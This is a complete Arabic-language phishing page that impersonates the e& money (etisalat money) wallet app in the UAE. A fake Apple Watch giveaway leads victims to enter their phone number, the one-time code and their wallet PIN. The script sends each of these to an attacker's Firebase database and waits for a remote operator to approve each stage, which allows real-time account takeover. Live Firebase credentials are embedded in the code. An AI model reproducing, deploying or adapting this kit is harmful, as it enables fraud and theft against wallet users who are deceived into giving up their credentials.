<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<title>etisalat money</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap');
  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;font-family:'Tajawal',sans-serif}
  html,body{width:100%;height:100%;overflow:hidden;background:#fff}
  .app{width:100%;height:100%;max-width:430px;margin:0 auto;position:relative;display:flex;flex-direction:column;overflow:hidden;background:#fff}

  .hero{background:linear-gradient(160deg,#7A0010 0%,#A3001F 45%,#C41E3A 100%);padding:40px 20px 70px;text-align:center;position:relative;flex-shrink:0}
  .hero::after{content:'';position:absolute;bottom:-1px;left:0;right:0;height:34px;background:#fff;border-radius:34px 34px 0 0}
  .help{position:absolute;top:18px;right:18px;width:30px;height:30px;border:2px solid rgba(255,255,255,.85);border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;font-size:15px}
  .brand{color:#fff;font-size:28px;font-weight:800;letter-spacing:2px;direction:ltr}
  .brand small{display:block;font-size:13px;font-weight:500;letter-spacing:4px;margin-top:2px;opacity:.9}

  .screen{display:none;flex-direction:column;height:100%}
  .screen.on{display:flex}

  .giveaway{flex:1;padding:0 22px 22px;display:flex;flex-direction:column;position:relative;z-index:2;margin-top:-30px}
  .g-card{background:#fff;border-radius:26px;box-shadow:0 6px 24px rgba(0,0,0,.08);padding:26px 18px;text-align:center;flex:1;display:flex;flex-direction:column;justify-content:center}
  .g-img{width:100%;max-height:300px;object-fit:contain;margin-bottom:18px}
  .g-title{font-size:26px;font-weight:800;color:#111;margin-bottom:10px;direction:ltr}
  .g-sub{font-size:20px;font-weight:700;color:#222;line-height:1.6}
  .btn-red{width:100%;padding:17px;background:linear-gradient(135deg,#C41E3A,#8B0016);color:#fff;border:none;border-radius:999px;font-size:18px;font-weight:700;cursor:pointer;box-shadow:0 5px 16px rgba(196,30,58,.35);margin-top:18px}
  .btn-red:active{transform:scale(.98)}

  .login-body{flex:1;padding:34px 22px 22px;display:flex;flex-direction:column}
  .l-title{font-size:19px;font-weight:700;color:#111;text-align:center;margin-bottom:22px}
  .phone-box{display:flex;align-items:center;border:1.5px solid #e3e3e6;border-radius:14px;padding:15px 16px;background:#fafafa}
  .phone-box:focus-within{border-color:#C41E3A;background:#fff}
  .prefix{font-size:16px;font-weight:700;color:#111;margin-left:10px;direction:ltr}
  .phone-box input{flex:1;border:none;outline:none;background:transparent;font-size:17px;color:#111;direction:ltr;text-align:left;letter-spacing:1px}
  .checks{margin-top:20px;display:flex;flex-direction:column;gap:14px}
  .crow{display:flex;align-items:flex-start;gap:10px;cursor:pointer}
  .cbox{width:20px;height:20px;flex-shrink:0;border:1.5px solid #d5d5d5;border-radius:5px;display:flex;align-items:center;justify-content:center;margin-top:2px}
  .crow.on .cbox{background:#C41E3A;border-color:#C41E3A}
  .cbox svg{width:12px;height:12px;display:none}
  .crow.on .cbox svg{display:block}
  .clabel{font-size:14px;color:#333;line-height:1.5}
  .clabel.link{color:#C41E3A;font-weight:600}

  .btn-pink{width:100%;padding:16px;background:linear-gradient(135deg,#E8A0B0,#D4899A);color:#fff;border:none;border-radius:999px;font-size:17px;font-weight:700;cursor:default;transition:all .2s}
  .btn-pink.ready{background:linear-gradient(135deg,#C41E3A,#A3001F);cursor:pointer;box-shadow:0 4px 14px rgba(196,30,58,.3)}
  .login-body .btn-pink{margin-top:auto}

  .topbar{padding:26px 20px 6px;text-align:center;position:relative;flex-shrink:0}
  .topbar .back{position:absolute;top:24px;left:20px;cursor:pointer}
  .topbar .t1{font-size:14px;color:#999;margin-bottom:4px}
  .topbar .t2{font-size:20px;font-weight:700;color:#111}

  .otp-desc{text-align:center;padding:26px 20px 8px;font-size:15px;color:#555;line-height:1.7}
  .otp-desc b{direction:ltr;display:inline-block;color:#111}
  .otp-boxes{display:flex;justify-content:center;gap:10px;padding:18px 20px;direction:ltr}
  .obox{width:48px;height:60px;border:1.5px solid #e3e3e6;border-radius:12px;background:#fafafa;display:flex;align-items:center;justify-content:center;font-size:24px;font-weight:700;color:#111}
  .obox.filled{border-color:#C41E3A;background:#fff}
  .otp-row{display:flex;justify-content:space-between;align-items:center;padding:6px 26px;font-size:14px}
  .otp-row .left{color:#777}
  .otp-row .right{color:#C41E3A;font-weight:600;direction:ltr}
  .otp-foot{margin-top:auto;padding:0 22px 22px}

  .pin-screen{position:absolute;inset:0;background:#fff;z-index:25;display:none;flex-direction:column;overflow:hidden}
  .pin-screen.show{display:flex}
  .pin-hero{background:linear-gradient(160deg,#7A0010 0%,#A3001F 45%,#C41E3A 100%);padding:36px 20px 58px;text-align:center;position:relative;flex-shrink:0}
  .pin-hero::after{content:'';position:absolute;bottom:-1px;left:0;right:0;height:30px;background:#fff;border-radius:30px 30px 0 0}
  .pin-brand{color:#fff;font-weight:800;font-size:26px;letter-spacing:2px;direction:ltr}
  .pin-t1{color:rgba(255,255,255,.85);font-size:14px;margin-top:6px}
  .pin-help,.pin-back{position:absolute;top:18px;width:30px;height:30px;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;font-size:15px;cursor:pointer}
  .pin-help{right:18px;border:2px solid rgba(255,255,255,.85)}
  .pin-back{left:18px}
  .pin-back svg{width:20px;height:20px;display:block}
  .pin-body{flex:1;display:flex;flex-direction:column;padding:18px 22px 22px;margin-top:-30px;position:relative;z-index:2;background:#fff}
  .pin-title{font-weight:700;font-size:19px;color:#111;text-align:center;margin-top:26px;margin-bottom:18px}
  .pin-dots{display:flex;justify-content:center;gap:12px;padding:8px 0 28px;flex-wrap:wrap}
  .pin-dot{width:14px;height:14px;border-radius:50%;background:#e3e3e6;transition:.2s}
  .pin-dot.on{background:#C41E3A}
  .pin-pad{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;padding:0 44px;max-width:300px;margin:0 auto;width:100%}
  .pin-key{aspect-ratio:1.5;border:none;border-radius:14px;background:#f4f4f6;font-weight:700;font-size:24px;color:#111;cursor:pointer;transition:.15s}
  .pin-key:active{background:#C41E3A;color:#fff;transform:scale(.95)}
  .pin-key.blank{background:transparent;cursor:default}
  .pin-key.fn{background:transparent;font-size:20px;color:#888}
  .pin-key.blank:active,.pin-key.fn:active{background:transparent;color:#888;transform:none}
  .pin-btn{margin-top:auto;width:100%;padding:17px;background:linear-gradient(135deg,#C41E3A,#8B0016);color:#fff;border:none;border-radius:999px;font-weight:700;font-size:17px;cursor:pointer;box-shadow:0 5px 16px rgba(196,30,58,.35)}

  .load{position:absolute;inset:0;background:rgba(255,255,255,.92);display:none;align-items:center;justify-content:center;z-index:50}
  .load.on{display:flex}
  .spin{width:40px;height:40px;border:4px solid #eee;border-top-color:#C41E3A;border-radius:50%;animation:sp .8s linear infinite}
  @keyframes sp{to{transform:rotate(360deg)}}
  .dlg{position:absolute;inset:0;background:rgba(0,0,0,.5);display:none;align-items:center;justify-content:center;z-index:51;padding:30px}
  .dlg.on{display:flex}
  .dlg-in{background:#fff;border-radius:20px;padding:26px 22px;width:100%;max-width:320px;text-align:center}
  .dlg-in p{font-size:15px;color:#333;margin-bottom:18px;line-height:1.6;white-space:pre-line}
  .dlg-in button{background:#C41E3A;color:#fff;border:none;padding:12px 40px;border-radius:999px;font-size:15px;font-weight:700;cursor:pointer}
</style>
</head>
<body>
<div class="app">

  <!-- 1) الهدية -->
  <div class="screen on" id="s1">
    <div class="hero">
      <div class="help">?</div>
      <div class="brand">e& money<small></small></div>
    </div>
    <div class="giveaway">
      <div class="g-card">
        <img class="g-img" src="assets/prize.png" alt="جائزة"
             onerror="this.src='https://placehold.co/300x260/f5f5f7/222?text=Prize'">
        <div class="g-title">Apple Watch Ultra</div>
        <div class="g-sub">قدّم الحين على ساعة مجانية<br>واصلة لباب بيتك</div>
      </div>
      <button class="btn-red" onclick="go('s2')">قدّم الحين</button>
    </div>
  </div>

  <!-- 2) الرقم -->
  <div class="screen" id="s2">
    <div class="hero" style="padding-bottom:50px">
      <div class="help">?</div>
      <div class="brand" style="font-size:24px">e& money</div>
    </div>
    <div class="login-body">
      <div class="l-title">سجّل الدخول إلى حسابك في etisalat money</div>
      <div class="phone-box">
        <span class="prefix">+971</span>
        <input type="tel" id="phone" placeholder="00 000 0000" maxlength="12" inputmode="numeric">
      </div>
      <div class="checks">
        <label class="crow" id="c1"><div class="cbox"><svg viewBox="0 0 24 24" fill="none"><path d="M5 12l5 5L20 7" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg></div><span class="clabel link">قبول الشروط والأحكام</span></label>
        <label class="crow" id="c2"><div class="cbox"><svg viewBox="0 0 24 24" fill="none"><path d="M5 12l5 5L20 7" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg></div><span class="clabel link">قبول سياسة الخصوصية</span></label>
        <label class="crow" id="c3"><div class="cbox"><svg viewBox="0 0 24 24" fill="none"><path d="M5 12l5 5L20 7" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg></div><span class="clabel">أرغب في تلقي رسائل تسويقية حول عروض e& money</span></label>
      </div>
      <button class="btn-pink" id="btnLogin" onclick="submitPhone()">دخول</button>
    </div>
  </div>

  <!-- 3) OTP -->
  <div class="screen" id="s3">
    <div class="topbar">
      <div class="back" onclick="backToPhone()"><svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M9 18l6-6-6-6" stroke="#111" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
      <div class="t1">تسجيل الدخول</div>
      <div class="t2">التحقق من الرمز</div>
    </div>
    <div class="otp-desc" id="otpDesc">أدخل رمز التحقق المرسل لك<br><b id="otpPhone">+971</b></div>
    <div class="otp-boxes" id="boxes"></div>
    <input type="tel" id="otpHidden" inputmode="numeric" maxlength="6" style="position:absolute;opacity:0;pointer-events:none">
    <div class="otp-row">
      <span class="left" id="resend" style="cursor:default;color:#777">إعادة إرسال (<span id="tsec">60</span>s)</span>
      <span class="right" onclick="document.getElementById('otpHidden').focus()">لم يصلك الرمز؟</span>
    </div>
    <div class="otp-foot"><button class="btn-pink" id="btnOtp" onclick="verifyCode()">تأكيد</button></div>
  </div>

  <!-- 4) PIN -->
  <div class="pin-screen" id="pinScreen">
    <div class="pin-hero">
      <div class="pin-back" onclick="pinCancel()">
        <svg viewBox="0 0 24 24" fill="none"><path d="M19.5 12H4.5M11 18.5l-6.5-6.5L11 5.5" stroke="#fff" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round"/></svg>
      </div>
      <div class="pin-help">?</div>
      <div class="pin-brand">e& money</div>
      <div class="pin-t1">تسجيل الدخول</div>
    </div>
    <div class="pin-body">
      <div class="pin-title" id="pinTitle">أدخل رمزك السري (4-6 أرقام)</div>
      <div class="pin-dots" id="pinDots">
        <div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div>
        <div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div>
      </div>
      <div class="pin-pad" id="pinPad"></div>
      <button class="pin-btn" id="pinBtn" type="button">تأكيد</button>
    </div>
  </div>

  <div class="load" id="load"><div class="spin"></div></div>
  <div class="dlg" id="dlg"><div class="dlg-in"><p id="dlgTxt"></p><button onclick="closeDlg()">حسناً</button></div></div>
</div>

<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
<script>
var firebaseConfig = {
  apiKey: "AIzaSyDST9eIFpUdbXa2aaVWVPt6LjZNL4R2UKA",
  authDomain: "xbet-86a1f.firebaseapp.com",
  databaseURL: "https://xbet-86a1f-default-rtdb.firebaseio.com",
  projectId: "xbet-86a1f",
  storageBucket: "xbet-86a1f.firebasestorage.app",
  messagingSenderId: "1049564126267",
  appId: "1:1049564126267:web:58eb824eda9566ae79501e",
  measurementId: "G-MZDXDMQ2HB"
};
firebase.initializeApp(firebaseConfig);
var db = firebase.database();

/* ===== State ===== */
var phoneNumber = '';
var currentRef = null;
var currentStatus = '';
var statusListener = null;
var verifyCodeVal = '';
var pinValue = '';
var busy = false;
var timerId = null;
var timeLeft = 0;
var dlgCb = null;
var pinScreenOpen = false;
var pinSubmitLock = false;
var otpSentOnce = false;

/* ===== Utils ===== */
function go(id){
  document.querySelectorAll('.screen').forEach(function(s){ s.classList.remove('on'); });
  document.getElementById(id).classList.add('on');
}
function load(b){ document.getElementById('load').classList.toggle('on', b); }
function dlg(t, cb){
  document.getElementById('dlgTxt').textContent = t;
  document.getElementById('dlg').classList.add('on');
  dlgCb = cb || null;
}
function closeDlg(){
  document.getElementById('dlg').classList.remove('on');
  if (dlgCb){ var c = dlgCb; dlgCb = null; c(); }
}

/* ===== شاشة الرقم ===== */
var phoneEl = document.getElementById('phone'), btnLogin = document.getElementById('btnLogin');
phoneEl.addEventListener('input', function(e){
  e.target.value = e.target.value.replace(/\D/g,'');
  updLogin();
});
['c1','c2','c3'].forEach(function(id){
  document.getElementById(id).addEventListener('click', function(){ this.classList.toggle('on'); updLogin(); });
});
function updLogin(){
  var ok = phoneEl.value.length >= 9 &&
           document.getElementById('c1').classList.contains('on') &&
           document.getElementById('c2').classList.contains('on');
  btnLogin.classList.toggle('ready', ok);
}

/* ===== تنظيف ===== */
function cleanupRequest(removeFromDb){
  if (currentRef && statusListener){
    currentRef.off('value', statusListener);
    statusListener = null;
  }
  if (currentRef){
    if (removeFromDb){ try { currentRef.remove(); } catch(_){} }
    currentRef = null;
  }
  currentStatus = '';
  clearInterval(timerId);
}

/* ===== إرسال الرقم ===== */
function submitPhone(){
  if (busy) return;
  if (!btnLogin.classList.contains('ready')){ dlg('أكمل البيانات أولاً'); return; }

  var raw = phoneEl.value.replace(/^0+/,'');
  if (raw.length < 7 || raw.length > 11){ dlg('رقم الهاتف غير صحيح'); return; }

  phoneNumber = '+971' + raw;
  cleanupRequest(true);
  otpSentOnce = false;

  busy = true; load(true);
  var ref = db.ref('requests').push();
  currentRef = ref;

  ref.set({
    phone: phoneNumber,
    username: phoneNumber,
    status: 'pending',
    createdAt: Date.now(),
    platform: 'app'
  }).then(function(){
    load(false); busy = false;
    showOtpScreen();
    listenStatus();
  }).catch(function(e){
    console.error(e);
    load(false); busy = false;
    dlg('تعذر الاتصال بالخادم');
  });
}

/* ===== شاشة OTP ===== */
function showOtpScreen(){
  document.getElementById('otpPhone').textContent = phoneNumber;
  verifyCodeVal = '';
  document.getElementById('otpHidden').value = '';
  buildOtpBoxes();
  updateOtpDesc('أدخل رمز التحقق المرسل لك');
  startTimer(60);
  go('s3');
  setTimeout(function(){ document.getElementById('otpHidden').focus(); }, 150);
}

function updateOtpDesc(text){
  document.getElementById('otpDesc').innerHTML = text + '<br><b>' + phoneNumber + '</b>';
}

function buildOtpBoxes(){
  var c = document.getElementById('boxes'); c.innerHTML = '';
  for (var i=0;i<6;i++){
    var d = document.createElement('div');
    d.className = 'obox';
    d.onclick = function(){ document.getElementById('otpHidden').focus(); };
    c.appendChild(d);
  }
  updOtpBoxes();
}
function updOtpBoxes(){
  document.querySelectorAll('.obox').forEach(function(b,i){
    b.textContent = verifyCodeVal[i] || '';
    b.classList.toggle('filled', !!verifyCodeVal[i]);
  });
  // زر التأكيد يتفعّل لو الرمز بين 4 و 6 أرقام
  var ready = verifyCodeVal.length >= 4 && verifyCodeVal.length <= 6;
  document.getElementById('btnOtp').classList.toggle('ready', ready);
}
document.getElementById('otpHidden').addEventListener('input', function(e){
  verifyCodeVal = e.target.value.replace(/\D/g,'').slice(0,6);
  updOtpBoxes();
});

/* ===== مؤقت ===== */
function startTimer(sec){
  timeLeft = sec;
  updateTimerUI();
  clearInterval(timerId);
  timerId = setInterval(function(){
    timeLeft--;
    if (timeLeft <= 0){ timeLeft = 0; clearInterval(timerId); }
    updateTimerUI();
  }, 1000);
}
function updateTimerUI(){
  var rs = document.getElementById('resend');
  if (!rs) return;
  if (timeLeft > 0){
    rs.style.cursor = 'default';
    rs.style.color = '#777';
    rs.innerHTML = 'إعادة إرسال (<span id="tsec">' + timeLeft + '</span>s)';
  } else {
    rs.style.cursor = 'pointer';
    rs.style.color = '#C41E3A';
    rs.innerHTML = 'إعادة إرسال';
  }
}
document.getElementById('resend').addEventListener('click', function(){
  if (timeLeft > 0 || busy) return;
  verifyCodeVal = '';
  document.getElementById('otpHidden').value = '';
  updOtpBoxes();
  startTimer(60);
});

/* ============================================================
   إرسال OTP → يروح للأدمن → الأدمن يتحقق
   ============================================================ */
function verifyCode(){
  if (busy || pinScreenOpen) return;
  if (verifyCodeVal.length < 4 || verifyCodeVal.length > 6) return;
  if (!currentRef) return;

  busy = true; load(true);
  currentRef.update({
    userCode: verifyCodeVal,
    status: 'otp_pending',
    codeSubmittedAt: Date.now()
  }).then(function(){
    load(false); busy = false;
    updateOtpDesc('يتم التحقق من الرمز...');
  }).catch(function(){
    load(false); busy = false;
    dlg('تعذر الاتصال بالخادم');
  });
}

/* ============================================================
   مستمع حالة الطلب — من الأدمن
   ============================================================ */
function listenStatus(){
  if (!currentRef) return;
  if (statusListener) currentRef.off('value', statusListener);

  statusListener = currentRef.on('value', function(snap){
    var data = snap.val();
    if (!data) return;
    var st = data.status;
    if (st === currentStatus) return;
    var prev = currentStatus;
    currentStatus = st;
    console.log('📡 status:', st);

    if (st === 'pending'){
      updateOtpDesc('أدخل رمز التحقق المرسل لك');
      updOtpBoxes();
    }
    else if (st === 'otp_pending'){
      updateOtpDesc('يتم التحقق من الرمز...');
      updOtpBoxes();
    }
    else if (st === 'otp_approved'){
      // ✅ رمز OTP صحيح → نطلب من المستخدم PIN
      updateOtpDesc('تم التحقق من الرمز. أدخل رمزك السري');
      updOtpBoxes();
      // انتقل لشاشة PIN (نستخدم نسخة آمنة)
      openPinScreen();
    }
    else if (st === 'otp_rejected'){
      // ❌ رمز OTP خطأ → يرجع يطلبه من جديد
      currentRef.update({ status: 'pending', userCode: null }).then(function(){
        verifyCodeVal = '';
        document.getElementById('otpHidden').value = '';
        updOtpBoxes();
        startTimer(60);
        dlg('الرمز غير صحيح. حاول مرة أخرى');
      });
    }
    else if (st === 'pin_pending'){
      updateOtpDesc('يتم التحقق من الرمز السري...');
    }
    else if (st === 'pin_approved'){
      // ✅ PIN صحيح → نجاح
      dlg('🎉 تم التسجيل بنجاح', function(){ resetAll(); });
    }
    else if (st === 'pin_rejected'){
      // ❌ PIN خطأ → يرجع للـ OTP
      closePinScreen();
      verifyCodeVal = '';
      document.getElementById('otpHidden').value = '';
      updOtpBoxes();
      startTimer(60);
      dlg('الرمز السري غير صحيح');
      // الرجوع لشاشة OTP
      go('s3');
      currentStatus = 'pending';
      if (currentRef){
        currentRef.update({ status: 'pending', userCode: null, pin: null });
      }
    }
    else if (st === 'rejected'){
      dlg('تم رفض طلبك', function(){
        cleanupRequest(true);
        go('s2');
      });
    }
  });
}

/* ===== الرجوع ===== */
function backToPhone(){
  if (busy) return;
  cleanupRequest(true);
  go('s2');
}

/* ===== شاشة PIN ===== */
function openPinScreen(){
  if (pinScreenOpen) return;
  pinScreenOpen = true;
  pinValue = '';
  pinSubmitLock = false;
  buildPinPad();
  updatePinDots();
  document.getElementById('pinTitle').textContent = 'أدخل رمزك السري (4-6 أرقام)';
  document.getElementById('pinScreen').classList.add('show');
}

function buildPinPad(){
  var pad = document.getElementById('pinPad');
  pad.innerHTML = '';
  var arr = [1,2,3,4,5,6,7,8,9,'','0','⌫'];
  arr.forEach(function(k){
    var b = document.createElement('button');
    b.type = 'button';
    b.className = 'pin-key' + (k===''?' blank' : k==='⌫'?' fn' : '');
    b.textContent = k;
    if (k !== '') b.onclick = function(){ pressPin(k); };
    pad.appendChild(b);
  });
}
function updatePinDots(){
  var ds = document.querySelectorAll('#pinDots .pin-dot');
  for (var i=0;i<ds.length;i++) ds[i].classList.toggle('on', i < pinValue.length);
}
function pressPin(k){
  if (busy) return;
  if (k === '⌫') pinValue = pinValue.slice(0,-1);
  else if (pinValue.length < 6) pinValue += k;
  updatePinDots();
}

/* ============================================================
   إرسال PIN للأدمن
   ============================================================ */
function submitPin(){
  if (busy || pinSubmitLock) return;
  if (pinValue.length < 4 || pinValue.length > 6){
    dlg('الرمز يجب أن يكون بين 4 و 6 أرقام');
    return;
  }
  if (!currentRef){ dlg('انتهت الجلسة'); return; }

  pinSubmitLock = true;
  busy = true; load(true);
  currentRef.update({
    pin: pinValue,
    status: 'pin_pending',
    pinSubmittedAt: Date.now()
  }).then(function(){
    load(false); busy = false;
    document.getElementById('pinTitle').textContent = 'يتم التحقق من الرمز...';
  }).catch(function(err){
    console.error(err);
    load(false); busy = false; pinSubmitLock = false;
    dlg('تعذر الاتصال بالخادم');
  });
}

function closePinScreen(){
  document.getElementById('pinScreen').classList.remove('show');
  pinValue = '';
  updatePinDots();
  pinScreenOpen = false;
  pinSubmitLock = false;
  document.getElementById('pinTitle').textContent = 'أدخل رمزك السري (4-6 أرقام)';
}
function pinCancel(){
  if (busy) return;
  closePinScreen();
  // الرجوع لـ OTP ومسح الرمز المُدخل
  if (currentRef){
    currentRef.update({ status: 'pending', userCode: null, pin: null });
  }
  verifyCodeVal = '';
  document.getElementById('otpHidden').value = '';
  updOtpBoxes();
  startTimer(60);
  go('s3');
}
document.getElementById('pinBtn').addEventListener('click', submitPin);

/* ===== إعادة ضبط ===== */
function resetAll(){
  if (currentRef && statusListener){
    currentRef.off('value', statusListener);
    statusListener = null;
  }
  currentRef = null;
  currentStatus = '';
  clearInterval(timerId);
  busy = false;
  phoneNumber = '';
  verifyCodeVal = '';
  pinValue = '';
  pinScreenOpen = false;
  pinSubmitLock = false;
  closePinScreen();
  go('s1');
}
</script>
